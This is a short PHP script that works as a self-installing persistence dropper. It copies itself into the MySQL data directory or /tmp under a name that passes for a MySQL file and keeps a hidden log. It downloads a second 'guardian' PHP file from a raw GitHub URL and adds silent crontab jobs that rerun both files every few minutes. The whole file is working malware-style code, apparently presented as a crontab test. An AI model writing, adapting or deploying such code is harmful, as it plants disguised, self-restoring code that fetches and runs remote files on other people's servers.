<?php

$baseGit = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
$targetDir = "/var/lib/mysql/"; 
if (!is_writable($targetDir)) $targetDir = "/tmp/"; // Если нет прав в mysql, пишем в /tmp/

$sysHash = substr(md5(gethostname()), 0, 5);
$name1 = "mysql_db_query_" . $sysHash . ".php";
$name2 = "mysql_lib_sync_" . $sysHash . ".php";

$path1 = $targetDir . $name1;
$path2 = $targetDir . $name2;
$sharedLog = $targetDir . ".mysql_system.log";

function writeLog($msg) {
    global $sharedLog;
    $date = date("Y-m-d H:i:s");
    $content = "[$date] [MAIN_MODULE]: $msg\n";
    file_put_contents($sharedLog, $content, FILE_APPEND);
}

if (__FILE__ !== $path1) {
    copy(__FILE__, $path1);
    chmod($path1, 0755);
    writeLog("Installed to $path1");
}

$ch = curl_init("https://google.com");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
writeLog("CURL request to Google. Status: $status");
curl_close($ch);

if (!file_exists($path2)) {
    writeLog("ALERT: Guardian file missing! Downloading from Git...");
    $code = @file_get_contents($baseGit . "file2.php");
    if ($code) {
        file_put_contents($path2, $code);
        chmod($path2, 0755);
        writeLog("Guardian file restored successfully.");
    }
}

$currentCron = shell_exec("crontab -l 2>/dev/null");
if (strpos($currentCron, $name1) === false || strpos($currentCron, $name2) === false) {
    $job1 = "* * * * * /usr/bin/php $path1 > /dev/null 2>&1";
    $job2 = "*/5 * * * * /usr/bin/php $path2 > /dev/null 2>&1";
    $newCron = $currentCron . "\n" . $job1 . "\n" . $job2 . "\n";
    file_put_contents("/tmp/.c", $newCron);
    exec("crontab /tmp/.c && rm /tmp/.c");
    writeLog("Persistence updated in crontab.");
}
?>
